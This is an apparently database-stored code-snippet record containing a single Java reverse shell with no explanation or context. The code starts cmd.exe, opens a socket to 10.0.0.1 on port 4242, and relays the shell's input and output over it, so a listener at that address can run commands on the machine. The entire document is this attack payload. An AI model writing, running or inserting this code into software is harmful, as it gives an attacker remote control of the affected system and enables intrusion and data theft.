---
id: 8fb02a8c-0d35-47ac-8e83-75540f572ea9
type: code
language: Java
verified: false
created_at: '2023-04-06T03:56:24.696793+00:00'
updated_at: '2023-04-10T20:25:30.894720+00:00'
---

# Code Snippet 8fb02a8c

**Language**: Java

```java
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


